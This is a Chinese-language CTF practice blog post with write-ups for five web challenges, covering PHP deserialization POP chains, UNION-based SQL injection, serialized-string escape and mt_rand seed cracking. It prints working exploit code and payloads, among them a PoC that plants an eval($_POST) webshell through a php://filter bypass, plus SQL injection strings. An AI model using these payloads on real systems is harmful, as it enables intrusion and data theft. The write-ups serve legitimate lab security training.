# Week3 Summary

- 打WMCTF 和 DasCTF被师傅们打爆了QAQ，只好等WP了
- 继续刷BUUing

## 刷题ing

### [EIS 2019]EzPOP

题目给出源码，有点复杂的 POP 链构造，但主要知识点不难。

```php
<?php
error_reporting(0);

class A {

    protected $store;

    protected $key;

    protected $expire;

    public function __construct($store, $key = 'flysystem', $expire = null) {
        $this->key = $key;
        $this->store = $store;
        $this->expire = $expire;
    }

    public function cleanContents(array $contents) {
        $cachedProperties = array_flip([
            'path', 'dirname', 'basename', 'extension', 'filename',
            'size', 'mimetype', 'visibility', 'timestamp', 'type',
        ]);

        foreach ($contents as $path => $object) {
            if (is_array($object)) {
                $contents[$path] = array_intersect_key($object, $cachedProperties);
            }
        }

        return $contents;
    }

    public function getForStorage() {
        $cleaned = $this->cleanContents($this->cache);

        return json_encode([$cleaned, $this->complete]);
    }

    public function save() {
        $contents = $this->getForStorage();

        $this->store->set($this->key, $contents, $this->expire);
    }

    public function __destruct() {
        if (!$this->autosave) {
            $this->save();
        }
    }
}

class B {

    protected function getExpireTime($expire): int {
        return (int) $expire;
    }

    public function getCacheKey(string $name): string {
        return $this->options['prefix'] . $name;
    }

    protected function serialize($data): string {
        if (is_numeric($data)) {
            return (string) $data;
        }

        $serialize = $this->options['serialize'];

        return $serialize($data);
    }

    public function set($name, $value, $expire = null): bool{
        $this->writeTimes++;

        if (is_null($expire)) {
            $expire = $this->options['expire'];
        }

        $expire = $this->getExpireTime($expire);
        $filename = $this->getCacheKey($name);

        $dir = dirname($filename);

        if (!is_dir($dir)) {
            try {
                mkdir($dir, 0755, true);
            } catch (\Exception $e) {
                // 创建失败
            }
        }

        $data = $this->serialize($value);

        if ($this->options['data_compress'] && function_exists('gzcompress')) {
            //数据压缩
            $data = gzcompress($data, 3);
        }

        $data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
        $result = file_put_contents($filename, $data);

        if ($result) {
            return true;
        }

        return false;
    }

}

if (isset($_GET['src']))
{
    highlight_file(__FILE__);
}

$dir = "uploads/";

if (!is_dir($dir))
{
    mkdir($dir);
}
unserialize($_GET["data"]);
```

主要的点是这里

```php
$data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
$result = file_put_contents($filename, $data);
```

这里就是要绕过 死亡exit 了，具体看[P神的解释](https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list)，利用 `php://filter/write=convert.base64-decode/resource=` 来绕过

其实也没啥好说的，找到攻击点往上推就行了，这里直接放 poc

```php
<?php

class A {
    protected $store;
    protected $key;
    protected $expire;

    public function __construct(){
        $this->key = 'R0SW3.php';
    }

    public function give($store){
        $this->store = $store;
    }
}

class B {
    public $options;
}

$a = new A();
$b = new B();
$b->options['serialize'] = 'strval';
$b->options['prefix'] = 'php://filter/write=convert.base64-decode/resource=';
$b->options['data_compress'] = false;
$b->options['expore'] = 1;
$a->give($b);
$object = array('path' => 'aaa' . base64_encode('<?php eval($_POST["R0SW3"]);?>'));
$path = 'test';
$a->cache = array($path => $object);
$a->complete = 'test';
echo urlencode(serialize($a));
```

tips：由于 A 类里用的是 protected ，最后要记得 urlencode 编码。

最后直接蚁剑连或者进入文件进行RCE就行了。

flag:

> flag{4485bf1d-37bc-412f-8e24-6043aebf71a4}

### [b01lers2020]Life on Mars

这题的难点是作者放了多个数据库，但其实没 ban 什么东西，好搞。

源码的 `life_on_mars.js` 提示了注入点(抓包也可以看出来

```js
function get_life(query) {
  $.ajax({
    type: "GET",
    url: "/query?search=" + query,
    data: "{}",
    contentType: "application/json; charset=utf-8",
    dataType: "json",
    cache: false,
    success: function(data) {
      var table_html =
        '<table id="results"><tr><th>Name</th><th>Description</th></tr>';
      $.each(data, function(i, item) {
        table_html +=
          "<tr><td>" + data[i][0] + "</td><td>" + data[i][1] + "</td></tr>";
      });
      table_html += "</table>";

      $("#results").replaceWith(table_html);
    },

    error: function(msg) { }
  });
}
```

这里 `/query?search=` 参数输入地名就可以查到数据，直接上 `union`。

前面的测试不说，当前数据库拿不到东西，直接查其他数据库。

```mysql
url/query?search=amazonis_planitia union select 1,schema_name from information_schema.schemata
```

查到三个数据库，`information_schema`， `alien_code`， `aliens`。`aliens` 是当前数据库，`information_schema` 这个是MySQL自带的信息数据库，那么就只剩下一个了，直接上流程。

查表

```mysql
url/query?search=amazonis_planitia union select 1,group_concat(table_name) from information_schema.tables where table_schema='alien_code'
```

> ["1","code"]

查列

```mysql
url/query?search=amazonis_planitia union select 1,group_concat(column_name) from information_schema.columns where table_schema='alien_code' and table_name='code'
```

> ["1","id,code"]

查数据

```mysql
url/query?search=amazonis_planitia union select 1,group_concat(code) from alien_code.code
```

> ["1","flag{8960d9d6-f9f7-43d7-9396-09f3dc305e0d}"]

### [DasCTF2021]寒王'sblog

社会工程题目，题目给出了解 flag 的步骤，但是没给出 `flag.jpg`。

直接去他的 gitee 上找找，在近期动态里可以找到。

![](https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210902145623591.png)

然后按照题目给出的步骤走就可以拿到 flag 了。

> flag{50aa7fe02602264e7d8102746416cd74}

### [GYCTF2020]Easyphp

#### www.zip文件泄露 + php反序列化字符逃逸

www.zip泄露出源码，可利用的有update.php

```php
<?php
require_once('lib.php');
echo '<html>
<meta charset="utf-8">
<title>update</title>
<h2>这是一个未完成的页面，上线时建议删除本页面</h2>
</html>';
if ($_SESSION['login']!=1){
	echo "你还没有登陆呢！";
}
$users=new User();
$users->update();
if($_SESSION['login']===1){
	require_once("flag.php");
	echo $flag;
}
?>
```

和lib.php

```php
<?php
error_reporting(0);
session_start();
function safe($parm)
{
    $array = array('union', 'regexp', 'load', 'into', 'flag', 'file', 'insert', "'", '\\', "*", "alter");
    str_replace($array, 'hacker', $parm);
    return 1;
}

class User
{
    public $id;
    public $age = null;
    public $nickname = null;

    public function login()
    {
        if (isset($_POST['username']) && isset($_POST['password'])) {
            $mysqli = new dbCtrl();
            $this->id = $mysqli->login('select id,password from user where username=?');
            if ($this->id) {
                $_SESSION['id'] = $this->id;
                $_SESSION['login'] = 1;
                echo "你的ID是" . $_SESSION['id'];
                echo "你好！" . $_SESSION['token'];
                echo "<script>window.location.href='./update.php'</script>";
                return $this->id;
            }
        }
    }

    public function update()
    {
        $Info = unserialize($this->getNewinfo());
        $age = $Info->age;
        $nickname = $Info->nickname;
        $updateAction = new UpdateHelper($_SESSION['id'], $Info, "update user SET age=$age,nickname=$nickname where id=" . $_SESSION['id']);
        //这个功能还没有写完 先占坑
    }

    public function getNewInfo()
    {
        $age = $_POST['age'];
        $nickname = $_POST['nickname'];
        return safe(serialize(new Info($age, $nickname)));
    }

    public function __destruct()
    {
        return file_get_contents($this->nickname);//危
    }

    public function __toString()
    {
        $this->nickname->update($this->age);
        return "0-0";
    }
}

class Info
{
    public $age;
    public $nickname;
    public $CtrlCase;

    public function __construct($age, $nickname)
    {
        $this->age = $age;
        $this->nickname = $nickname;
    }

    public function __call($name, $argument)
    {
        echo $this->CtrlCase->login($argument[0]);
    }
}

class UpdateHelper
{
    public $id;
    public $newinfo;
    public $sql;

    public function __construct($newInfo, $sql)
    {
        $newInfo = unserialize($newInfo);
        $upDate = new dbCtrl();
    }

    public function __destruct()
    {
        echo $this->sql;
    }
}

class dbCtrl
{
    public $hostname = "127.0.0.1";
    public $dbuser = "root";
    public $dbpass = "root";
    public $database = "test";
    public $name;
    public $password;
    public $mysqli;
    public $token;

    public function __construct()
    {
        $this->name = $_POST['username'];
        $this->password = $_POST['password'];
        $this->token = $_SESSION['token'];
    }

    public function login($sql)
    {
        $this->mysqli = new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);
        if ($this->mysqli->connect_error) {
            die("连接失败，错误:" . $this->mysqli->connect_error);
        }
        $result = $this->mysqli->prepare($sql);
        $result->bind_param('s', $this->name);
        $result->execute();
        $result->bind_result($idResult, $passwordResult);
        $result->fetch();
        $result->close();
        if ($this->token == 'admin') {
            return $idResult;
        }
        if (!$idResult) {
            echo('用户不存在!');
            return false;
        }
        if (md5($this->password) !== $passwordResult) {
            echo('密码错误！');
            return false;
        }
        $_SESSION['token'] = $this->name;
        return $idResult;
    }

    public function update($sql)
    {
        //还没来得及写
    }
}
```

虽然这有个`file_get_contents()`，但是由于flag被过滤了，所以不可用。

然后看到update()方法

```php
public function update()
{
        $Info = unserialize($this->getNewinfo());
        $age = $Info->age;
        $nickname = $Info->nickname;
        $updateAction = new UpdateHelper($_SESSION['id'], $Info, "update user SET age=$age,nickname=$nickname where id=" . $_SESSION['id']);
        //这个功能还没有写完 先占坑
}
```

很明显这里有一个反序列化的入口，简单审计可以很容易构造出pop链。

但是由于无法获取文件，那我们获取flag的方式只有使session['login'] = 1。

```php
public function login()
    {
        if (isset($_POST['username']) && isset($_POST['password'])) {
            $mysqli = new dbCtrl();
            $this->id = $mysqli->login('select id,password from user where username=?');
            if ($this->id) {
                $_SESSION['id'] = $this->id;
                $_SESSION['login'] = 1;
                echo "你的ID是" . $_SESSION['id'];
                echo "你好！" . $_SESSION['token'];
                echo "<script>window.location.href='./update.php'</script>";
                return $this->id;
            }
        }
    }
```

这里达到目的有两种方式，都是利用dbCtrl类的login方法。

一是使$this->token == admin。

![](https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210805150616717.png)

二是输入正确的密码。

![](https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210805150639158.png)

由于sql语句可控，这里我们用第二种方法。

sql语句改为`select "1","c4ca4238a0b923820dcc509a6f75849b" from user where username=?`

1的md5值为`c4ca4238a0b923820dcc509a6f75849b`通过这个语句输出的结果会返回1，则我们只需要控制$this->password的值即可。

![](https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210805151121757.png)

这里直接给poc:

```php
<?php

class User
{
    public $id;
    public $age;
    public $nickname;
    public function __construct(){
        $this->id = "1";
        $this->age = 'select "1","c4ca4238a0b923820dcc509a6f75849b" from user where username=?';
        $this->nickname = new Info();
    }
}

class Info
{
    public $age;
    public $nickname;
    public $CtrlCase;
    public function __construct()
    {
        $this->age = "1";
        $this->nickname = "2";
        $this->CtrlCase = new dbCtrl();
    }
}

class UpdateHelper
{
    public $sql;
}

class dbCtrl
{
    public $hostname = "127.0.0.1";
    public $dbuser = "root";
    public $dbpass = "root";
    public $database = "test";
    public $name;
    public $password;
    public $mysqli;
    public $token;
    public $test;
    public function __construct(){
        $this->password = "1";
        $this->name = "admin";
        $this->test = new UpdateHelper();
    }
}

$x = new Info();
$x->CtrlCase->test->sql = new User();
echo serialize($x);
```

得到的payload:

> O:4:"Info":3:{s:3:"age";s:1:"1";s:8:"nickname";s:1:"2";s:8:"CtrlCase";O:6:"dbCtrl":9:{s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:4:"root";s:6:"dbpass";s:4:"root";s:8:"database";s:4:"test";s:4:"name";s:5:"admin";s:8:"password";s:1:"1";s:6:"mysqli";N;s:5:"token";N;s:4:"test";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":3:{s:2:"id";s:1:"1";s:3:"age";s:72:"select "1","c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":3:{s:3:"age";s:1:"1";s:8:"nickname";s:1:"2";s:8:"CtrlCase";O:6:"dbCtrl":9:{s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:4:"root";s:6:"dbpass";s:4:"root";s:8:"database";s:4:"test";s:4:"name";s:5:"admin";s:8:"password";s:1:"1";s:6:"mysqli";N;s:5:"token";N;s:4:"test";O:12:"UpdateHelper":1:{s:3:"sql";N;}}}}}}}

由于lib.php中有:

```php
public function update()
{
	$Info = unserialize($this->getNewinfo());
	$age = $Info->age;
	$nickname = $Info->nickname;
	$updateAction = new UpdateHelper($_SESSION['id'], $Info, "update user SET age=$age,nickname=$nickname where id=" . $_SESSION['id']);
        //这个功能还没有写完 先占坑
}

public function getNewInfo()
{
	$age = $_POST['age'];
	$nickname = $_POST['nickname'];
	return safe(serialize(new Info($age, $nickname)));
}
```

所以我们需要通过反序列化字符逃逸绕过getNewInfo方法里的serizlize()。

> age=1'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''";s:8:"nickname";s:1:"2";s:8:"CtrlCase";O:6:"dbCtrl":9:{s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:4:"root";s:6:"dbpass";s:4:"root";s:8:"database";s:4:"test";s:4:"name";s:5:"admin";s:8:"password";s:1:"1";s:6:"mysqli";N;s:5:"token";N;s:4:"test";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":3:{s:2:"id";s:1:"1";s:3:"age";s:72:"select "1","c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":3:{s:3:"age";s:1:"1";s:8:"nickname";s:1:"2";s:8:"CtrlCase";O:6:"dbCtrl":9:{s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:4:"root";s:6:"dbpass";s:4:"root";s:8:"database";s:4:"test";s:4:"name";s:5:"admin";s:8:"password";s:1:"1";s:6:"mysqli";N;s:5:"token";N;s:4:"test";O:12:"UpdateHelper":1:{s:3:"sql";N;}}}}}}}

直接从update.php输入，然后任意密码登陆即可。

![](https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210805151951659.png)

> flag{4caee143-cb5b-48e5-bc67-37a8eaa6f830}



### [MRCTF2020]Ezaudit

这题刚看题目我还以为是要看audit日志读东西啥的，结果就只是mt种子爆破。

#### php低版本mt种子爆破

www.zip文件泄露出了index.php源码，且得知php版本为php5.6。

```php
<?php 
header('Content-type:text/html; charset=utf-8');
error_reporting(0);
if(isset($_POST['login'])){
    $username = $_POST['username'];
    $password = $_POST['password'];
    $Private_key = $_POST['Private_key'];
    if (($username == '') || ($password == '') ||($Private_key == '')) {
        // 若为空,视为未填写,提示错误,并3秒后返回登录界面
        header('refresh:2; url=login.html');
        echo "用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!";
        exit;
    }
    else if($Private_key != '*************' )
    {
        header('refresh:2; url=login.html');
        echo "假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!";
        exit;
    }
    else{
        if($Private_key === '************'){
            $getuser = "SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'".';'; 
            $link=mysql_connect("localhost","root","root");
            mysql_select_db("test",$link);
            $result = mysql_query($getuser);
            while($row=mysql_fetch_assoc($result)){
                echo "<tr><td>".$row["username"]."</td><td>".$row["flag"]."</td><td>";
            }
        }
    }
}
// genarate public_key 
function public_key($length = 16) {
    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $public_key = '';
    for ( $i = 0; $i < $length; $i++ )
    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
    return $public_key;
}

//genarate private_key
function private_key($length = 12) {
    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $private_key = '';
    for ( $i = 0; $i < $length; $i++ )
    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
    return $private_key;
}
$Public_key = public_key();
//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???
```

php低版本的mt种子问题，写个脚本导出值，然后php_mt_seed一把梭。

```python
char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
public_key = "KVQP0LdJKRaV3n9D"

print("[+]Result is: ")
for i in public_key:
    print(str(char.index(i)) + " " + str(char.index(i)) + " 0 " + "61", end=" ")
```

一把梭。

![](https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210808112013845.png)

得到的值在php[5.2.1 - 7.0.x]重新计算私钥的值。

```php
<?php

function public_key($length = 16) {
    mt_srand(1775196155);
    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $public_key = '';
    for ( $i = 0; $i < $length; $i++ )
        $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
    private_key();
}

//genarate private_key
function private_key($length = 12) {
    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $private_key = '';
    for ( $i = 0; $i < $length; $i++ )
        $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
    echo $private_key;
}
public_key();
```

> XuNhoueCDCGc

有私钥的值直接登陆即可，密码那还有个简单sql。

> Private_key=XuNhoueCDCGc&login=登录&password='+or+'1'='1&username=crispr

得到flag

> flag{9227093c-e6ac-4b87-b77b-516945f26eda}

